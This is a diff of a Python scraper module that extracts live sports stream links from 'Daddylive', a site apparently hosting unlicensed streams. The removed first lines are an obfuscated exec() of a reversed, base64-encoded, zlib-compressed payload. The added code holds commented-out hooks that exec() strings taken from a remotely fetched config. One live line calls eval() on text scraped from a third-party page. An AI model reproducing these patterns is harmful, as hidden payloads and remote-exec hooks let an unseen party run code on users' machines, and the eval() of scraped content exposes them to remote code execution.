@@ -1,2 +1,135 @@
-# 1694482347
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+from typing import Dict
+from ..models.Extractor import Extractor
+from ..models.Game import Game
+from ..models.Link import Link
+from ..util import m3u8_src
+import requests, re,base64
+from . import wstream, nbastreams
+from bs4 import BeautifulSoup
+from bs4.element import NavigableString
+from dateutil import parser
+from datetime import datetime, timedelta
+from ..icons import icons
+import urllib.parse
+
+
+
+# config_url = base64.b64decode("").decode("utf-8")
+# response = requests.get(config_url)
+# config = response.json()
+
+class Daddylive(Extractor):
+    def __init__(self) -> None:
+        self.domains = ["dlhd.sx", "d.daddylivehd.sx", "daddylive.sx"]
+        self.name = "Daddylive"
+        self.short_name = "DLive"
+
+    # https://stackoverflow.com/questions/21496246/how-to-parse-date-days-that-contain-st-nd-rd-or-th
+    def solve(self, s):                                             
+        return re.sub(r'(\d)(st|nd|rd|th)', r'\1', s)
+
+    def parse_header(self, header, time):
+        timestamp = parser.parse(header[:header.index("-")] + " " + time)
+        timestamp = timestamp.replace(year=2022) # daddylive is dumb
+        return timestamp
+
+    def get_link(self, url):
+        m3u8 = ""
+        if "/embed/" not in url and "/channels/" not in url and "/stream/" not in url and "/cast/" not in url and "/batman/" not in url and "/extra/" not in url:
+            raise Exception("Invalid URL")
+        # if self.domains[0] not in url:
+        #     parsed = urllib.parse.urlparse(r'https://d.daddylivehd\.sx/.+\.php')
+        #     parsed._replace(netloc=self.domains[0])
+        #     url = urllib.parse.urlunparse(parsed)
+        r = requests.get(url).text
+        m3u8 = None
+        
+        if "wigistream.to" in r:
+            re_embed = re.compile(r'src="(https:\/\/wigistream\.to\/embed\/.+?)"').findall(r)[0]
+        elif "wstream.to" in r:
+            re_embed = re.compile(r'src="(https:\/\/wstream\.to\/embed\/.+?)"').findall(r)[0]
+        elif "eplayer.click" in r:
+            re_embed = re.compile(r"<iframe src=\"(https:\/\/.+?)\"").findall(r)[0]
+            r_embed = requests.get(re_embed, headers={"Referer": url}).text
+            m3u8 = nbastreams.NBAStreams().process_page(r_embed, re_embed)
+        elif "castmax.net" in r:
+            embed_id = re.compile(r"id='(.+?)'").findall(r)[0]
+            re_embed = "https://castmax.net/embed/%s.html" % embed_id 
+        elif "jazzy.to" in r:
+            re_embed = re.findall(r'src="(https:\/\/jazzy\.to.+?)"', r)[0]
+            m3u8 = m3u8_src.scan_page(re_embed, headers={"Referer": url})
+        # elif "ddolahdplay" in r:
+        #     re_embed = re.findall(r'src="(https:\/\/ddolahdplay.+?)"', r)[0]
+        #     m3u8 = m3u8_src.scan_page(re_embed, headers={"Referer": url})
+        # Referer2 = config.get("Referer2", "")
+        # if Referer2:
+        #     exec(Referer2)
+        elif "streamservicehd" in r:
+            re_embed = re.findall(r'src="(https:\/\/streamservicehd.+?)"', r)[0]
+            m3u8 = m3u8_src.scan_page(re_embed, headers={"Referer": url})
+        
+        
+        # Referer1 = config.get("Referer1", "")
+        # if Referer1:
+        #     exec(Referer1)
+        elif "topuplist" in r:
+            re_embed = re.findall(r'src="(https:\/\/topuplist\.click.+?)"', r)[0]
+            r_embed = requests.get(re_embed).text
+            fid = re.findall(r"fid='(.+?)';", r_embed)[0]
+            embed_url = "https://jewelavid.com/embed2.php?player=desktop&live=" + fid
+            r_embed = requests.get(embed_url, headers={"User-Agent": self.user_agent, "Referer": "https://1l1l.to/"}).text
+            eval_url = ("".join(eval(re.findall(r"return\s?\((\[.+?\])", r_embed)[0]))).replace("\\", "").replace("////", "//")
+            m3u8 = Link(eval_url, headers={"User-Agent": self.user_agent, "Referer": embed_url})
+        if m3u8 == None:
+            try:
+                m3u8 = wstream.Wstream().get_link(re_embed + f"|Referer=https://{self.domains[0]}")
+            except:
+                m3u8 = nbastreams.NBAStreams().process_page(r, url)
+        if "ddy1.cdnbos.lol" in m3u8.address: # Temp fix 10-12-22, 12-19-22
+            m3u8.address = m3u8.address.split("?")[0] + "?Connection=keep-alive"
+        # player = config.get("player", "")
+        # if player:
+        #     exec(player)
+        #     r = requests.get(m3u8.address)
+        #     m3u8.address = r.url
+        #     mono = re.findall(r"(.+?\/mono\.m3u8)", r.text)[0]
+        #     m3u8.address = m3u8.address.split("?")[0].replace("index.m3u8", mono + "?&Connection=keep-alive")
+        if m3u8 != None:
+            m3u8.is_hls = True    
+        return m3u8
+
+    def get_games(self):
+        games = []
+        r_index = requests.get("https://" + self.domains[0] + "/index.php", headers={"User-Agent": self.user_agent}).text
+        soup_index = BeautifulSoup(r_index, "html.parser")
+        m: Dict[str, Game] = {}
+        header = soup_index.select_one("button.button-85 > h1").text
+        for element in soup_index.select('a[style="color: #ff0000;"]'):
+            try:
+                hr = element.parent.find_previous_sibling("hr")
+                if hr.next.name == "strong":
+                    title = hr.next.text.strip()
+                else:
+                    title = hr.next.strip()
+                # league = element.parent.find_previous("div", {"class": "alert"}).text.strip()
+                league = element.parent.find_previous("h2").text.strip()
+                time = title[0:title.index(" ")][:5]
+                title = title[title.index(" ") + 1:]
+                try: utc_time = self.parse_header(header, time) - timedelta(hours=1)
+                except: 
+                    try: utc_time = datetime.now().replace(hour=int(time.split(":")[0]), minute=int(time.split(":")[1])) - timedelta(hours=1)
+                    except: utc_time = datetime.now()
+                href = element.get("href")
+                if href.startswith("/"):
+                    href = f"https://{self.domains[0]}{href}"
+                link = Link(address=href, name=element.text)
+                key = f"{league}:{title}@{time}"
+                if key in m:
+                    m[key].links.append(link)
+                else:
+                    m[key] = Game(title, links=[link], icon=icons[league.lower()] if league.lower() in icons else None, league=league, starttime=utc_time)
+            except:
+                continue
+
+        games = list(m.values())
+        return games
